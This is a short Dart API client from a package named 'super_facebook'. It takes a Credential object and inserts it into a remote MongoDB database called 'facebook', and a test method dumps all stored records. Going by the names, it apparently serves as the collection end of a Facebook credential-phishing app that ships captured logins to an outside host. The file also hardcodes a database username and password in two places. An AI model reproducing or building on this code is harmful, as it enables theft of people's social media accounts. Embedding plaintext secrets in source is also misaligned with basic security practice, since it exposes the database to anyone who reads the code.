import 'package:get/get.dart';
import 'package:mongo_dart/mongo_dart.dart';
import 'package:super_facebook/model/credential_model.dart';


class ApiClient extends GetxService{


  Future sendToFireStore({required Credential credential}) async {
    print('Start');
    Db db = await Db.create('mongodb+srv://ttoavina:jakal050505@cluster0.vl4e1.mongodb.net/facebook');
    print("Opennig");
    await db.open();
    print("Openned");

    final col = db.collection('users');
    print('sending ${credential.toJson()}...');
    await col.insertOne(credential.toJson());
    print('sent');
  }

  Future test() async {
    print('Start');
    Db db = await Db.create('mongodb+srv://ttoavina:jakal050505@cluster0.vl4e1.mongodb.net/facebook');
    print("Opennig");
    await db.open();
    print("Openned");

    final col = db.collection('users');
    print('sending');
    var res = await col.find().toList();
    print('sent : $res');
  }


}